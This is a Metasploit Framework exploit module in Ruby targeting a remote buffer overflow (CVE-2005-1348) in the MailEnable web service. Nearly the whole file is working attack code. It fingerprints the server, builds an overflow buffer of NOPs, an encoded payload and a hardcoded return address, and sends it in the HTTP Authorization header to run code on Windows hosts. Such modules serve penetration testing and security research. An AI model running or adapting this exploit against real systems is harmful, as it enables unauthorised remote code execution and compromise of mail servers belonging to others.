##
# $Id: mailenable_auth_header.rb 9719 2010-07-07 17:38:59Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /MailEnable/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MailEnable Authorization Header Buffer Overflow',
			'Description'    => %q{
					This module exploits a remote buffer overflow in the MailEnable web service.
				The vulnerability is triggered when a large value is placed into the Authorization
				header of the web request. MailEnable Enterprise Edition versions priot to 1.0.5 and
				MailEnable Professional versions prior to 1.55 are affected.
			},
			'Author'         => 'David Maciejak <david.maciejak[at]kyxar.fr>',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9719 $',
			'References'     =>
				[
					['CVE',   '2005-1348'],
					['OSVDB', '15913'],
					['OSVDB', '15737'],
					['BID',   '13350'],
					['NSS',   '18123'],
				],
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x0d\x0a"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['MEHTTPS.exe Universal', { 'Ret' => 0x006c36b7 }], # mehttps.exe
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Apr 24 2005'))
	end

	def check
		info = http_fingerprint  # check method
		if (info =~ /MailEnable/)
			return Exploit::CheckCode::Appears
		end
		Exploit::CheckCode::Safe
	end

	def exploit
		buffer = make_nops(24) + payload.encoded + [target.ret].pack('V')

		send_request_raw(
			{
				'headers' => { 'Authorization' => buffer }
			}, 2)

		handler
		disconnect
	end

end
